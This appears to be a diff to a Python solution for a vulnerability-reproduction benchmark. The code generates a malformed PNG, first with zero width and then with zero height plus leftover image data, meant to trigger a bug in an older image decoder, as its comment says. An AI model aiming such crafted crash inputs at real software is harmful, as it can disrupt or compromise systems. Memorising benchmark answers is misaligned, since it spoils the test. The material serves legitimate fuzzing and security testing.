@@ -1,26 +1,36 @@
 import struct
 import zlib
+import binascii
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        def png_chunk(chunk_type: bytes, data: bytes) -> bytes:
-            length = struct.pack(">I", len(data))
-            crc = zlib.crc32(chunk_type)
-            crc = zlib.crc32(data, crc)
-            crc = struct.pack(">I", crc & 0xFFFFFFFF)
-            return length + chunk_type + data + crc
+        return self._make_png_zero_height()
 
-        def create_png_zero_width(height: int = 4, color_type: int = 0, bit_depth: int = 8, interlace: int = 0) -> bytes:
-            # PNG signature
-            png_sig = b"\x89PNG\r\n\x1a\n"
-            # IHDR: width=0 triggers the vulnerability in the old version
-            ihdr_data = struct.pack(">IIBBBBB", 0, height, bit_depth, color_type, 0, 0, interlace)
-            ihdr = png_chunk(b"IHDR", ihdr_data)
-            # IDAT: for width=0, each row has only the filter byte -> height bytes total
-            idat_payload = zlib.compress(b"\x00" * height)
-            idat = png_chunk(b"IDAT", idat_payload)
-            iend = png_chunk(b"IEND", b"")
-            return png_sig + ihdr + idat + iend
+    def _png_chunk(self, chunk_type: bytes, data: bytes) -> bytes:
+        length = struct.pack(">I", len(data))
+        crc = struct.pack(">I", binascii.crc32(chunk_type + data) & 0xffffffff)
+        return length + chunk_type + data + crc
 
-        # Construct a minimal PNG with zero width and small height; grayscale, non-interlaced
-        return create_png_zero_width(height=4, color_type=0, bit_depth=8, interlace=0)
+    def _make_png_zero_height(self) -> bytes:
+        # Create a PNG with width=1 and height=0 but with IDAT data for one scanline
+        signature = b"\x89PNG\r\n\x1a\n"
+
+        width = 1
+        height = 0
+        bit_depth = 8
+        color_type = 2  # Truecolor (RGB)
+        compression = 0
+        filter_method = 0
+        interlace = 0
+
+        ihdr_data = struct.pack(">IIBBBBB", width, height, bit_depth, color_type, compression, filter_method, interlace)
+        ihdr_chunk = self._png_chunk(b'IHDR', ihdr_data)
+
+        # One scanline for width=1, color_type=2: filter byte + 3 bytes RGB = 4 bytes total
+        raw_scanline = b'\x00' + b'\x00\x00\x00'
+        compressed = zlib.compress(raw_scanline, level=9)
+        idat_chunk = self._png_chunk(b'IDAT', compressed)
+
+        iend_chunk = self._png_chunk(b'IEND', b'')
+
+        return signature + ihdr_chunk + idat_chunk + iend_chunk
